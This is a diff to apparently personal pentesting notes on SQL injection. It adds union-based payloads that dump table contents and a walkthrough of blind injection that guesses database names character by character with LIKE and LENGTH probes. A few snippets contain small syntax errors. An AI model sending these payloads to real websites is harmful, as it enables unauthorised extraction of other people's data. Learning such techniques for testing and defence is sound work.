@@ -228,7 +228,7 @@ SELECT [...] ORDER BY 4 -- OK
 ```
 </details>
 
-The second objective is to find the DBMS, and it's version, just to ensure that any following query is valid in the DBMS language.
+The second objective is to find the DBMS, and it's version, just to ensure that any following query is valid in the DBMS language. You can fetch the user too with `user()`.
 
 ```sql
 SELECT [...] UNION SELECT @@version, NULL, NULL, NULL
@@ -256,4 +256,92 @@ SELECT [...] UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM infor
 ```
 
 Now, you have everything you need to dump all results.
+
+```sql
+SELECT [...] UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM table_name
+```
+</div></div>
+
+<hr class="sl">
+
+## Manual Error-based SQLi
+
+<div class="row row-cols-md-2"><div>
+
+You better be prepared, manual error-based SQLi may take QUITE some time, as you may have to iterate a lot of characters. Let's say you found the following GET form to be injectable. If you use "1", you can see a valid account, but if you return "0", you will see "page not found".
+
+```http request
+GET /account?id=1
+```
+
+Then, your starting point will be
+
+```http request
+GET /account?id=1' AND 1=0-- -
+```
+
+Now, the id is valid, but you will see "page not found". That's how you will have to play with the request. When you got "page not found", it will mean that you condition failed, and bit-by-bit you will map the database. There are two well-known way to process
+
+* Using ASCII
+
+```
+WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
+-- extract the the first character (pos=1, len=1)
+-- of a text 'text'. Convert the character to ASCII
+-- and, check if this is the same as the ASCII of 'a'
+```
+
+* Using LIKE
+
+```
+WHERE text LIKE 'a%'
+-- is text starting with 'a'
+```
+
+> I will, obviously use LIKE, because it's more efficient
+</div><div>
+
+First, to avoid losing too much motivation, it may be better to test how many characters you are looking for. For instance, for the database name
+
+```
+' AND LENGTH(database()) > 5 -- -
+' AND LENGTH(database()) > 15 -- -
+' AND LENGTH(database()) > 12 -- -
+' AND LENGTH(database()) == 14 -- --
+[...]
+```
+
+Then, you can start. As everything is the same as for **Union-based SQLi**, and the process is the same for every text, I will only show an example with getting the database name.
+
+```
+' AND database() LIKE '%' -- - // test, should always be true
+' AND database() LIKE 'a%' -- - // starting
+' AND database() LIKE 'b%' -- -
+[...]
+' AND database() LIKE 'm%' -- - // ok
+' AND database() LIKE 'ma%' -- -
+' AND database() LIKE 'mb%' -- -
+[...]
+' AND database() LIKE 'my_example' -- - // found 😢
+```
+
+Sometimes, there maybe more than one match. For instance, we could have a database starting with `my_`. In such case, to know if there are more databases like this, you have to exclude the one you found.
+
+```
+' AND database()!='my_example' AND database() LIKE 'my_%' -- -
+```
+
+If the query returns true, you may have one more database to check up. In the end, you will have to do like union, and work with queries like
+
+```
+' UNION SELECT NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema = 'database_name' and table_name like 'table_name' and COLUMN_NAME LIKE "a%" -- -
+```
+
+You may try other kind of question than only "is the nth character x".
+
+```
+-- do the table name contains 0?
+table_name LIKE '%0%'
+```
+
 </div></div>
